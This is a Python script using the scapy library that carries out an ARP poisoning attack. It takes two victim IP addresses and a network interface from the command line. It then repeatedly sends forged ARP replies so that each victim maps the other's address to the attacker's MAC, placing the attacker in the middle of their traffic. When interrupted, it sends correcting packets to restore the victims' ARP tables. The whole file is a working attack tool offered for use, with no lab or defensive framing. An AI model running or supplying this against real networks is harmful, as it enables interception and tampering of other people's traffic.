# Packages
import scapy.all as scapy
import sys, time

# Constants
DIVIDER = '=' * 60
POISON_BREAK = 30

# ARP Poisoning Attack
class ARPPoisoning():
    # Constructs the ARP Poisoning Attack
    def __init__(self, victimOneIP, victimTwoIP, interface):
        # Disables verbosity (command line) mode
        scapy.conf.verb = 0
        
        # Assign targets
        self.victimOneIP = victimOneIP
        self.victimTwoIP = victimTwoIP
        self.interface = interface

        # Assign default scapy interface
        scapy.conf.iface = interface

        # Assign macAddresses
        self.victimOneMac = scapy.getmacbyip(victimOneIP)
        self.victimTwoMac = scapy.getmacbyip(victimTwoIP)
        self.deviceMac = scapy.get_if_hwaddr(interface)

    # Returns interactive prompt string
    def __repr__(self):
        return 'ARPPoisoning({}, {}, {})'.format(self.victimOneIP, self.victimTwoIP, self.interface)

    # Returns string representation
    def __str__(self):
        return 'ARP Poisoning on {}:\n - Victim One IP {} at {}\n - Victim Two IP {} at {}'.format(
                self.interface, self.victimOneIP, self.victimOneMac, self.victimTwoIP, self.victimTwoMac)

    # Print Initialization Message
    def printInitializationMessage(self):
        print('{divider}\nRunning {str}\n{divider}'.format(divider = DIVIDER, str = self))
        print('Press [CTRL-C] to stop the ARP Poisoning and clean the ARP tables of the victims')

    # Execute the attack
    def execute(self):
        # Print initialization message
        self.printInitializationMessage()

        # Setup packets
        # ARP Poisoning packet for victim one
        victimOnePoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                           psrc = self.victimTwoIP,
                           pdst = self.victimOneIP, 
                           hwdst = self.victimOneMac)

        # ARP Poisoning packet for victim two
        victimTwoPoisonPacket = scapy.ARP(hwsrc = self.deviceMac,
                            psrc = self.victimOneIP,
                            pdst = self.victimTwoIP,
                            hwdst = self.victimTwoMac)

        # Infinitely poisons the victims
        while True:
            try: # Send poison packets
                scapy.send(victimOnePoisonPacket)
                scapy.send(victimTwoPoisonPacket)
                time.sleep(POISON_BREAK)
            except KeyboardInterrupt: # CTRL-C was pressed
                self.clean() # Cleaning ARP tables of the victims
                break # Stop the poisoning-loop

    # Clean ARP tables of the victims
    def clean(self):
        # Clean victim one's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.victimTwoIP,
            hwsrc=self.victimTwoMac,
            pdst=self.victimOneIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)
        # Clean victim two's ARP Table
        scapy.send(scapy.ARP(
            op=2,
            psrc=self.victimOneIP,
            hwsrc=self.victimOneMac,
            pdst=self.victimTwoIP,
            hwdst="ff:ff:ff:ff:ff:ff"), count=5)

# Starts the program
if __name__ == '__main__':


    # Assign parameters to variables
    victimOneIP = sys.argv[1]
    victimTwoIP = sys.argv[2]
    interface = sys.argv[3]

    # Initialize Attack
    attack = ARPPoisoning(victimOneIP, victimTwoIP, interface)

    # Execute attack
    attack.execute()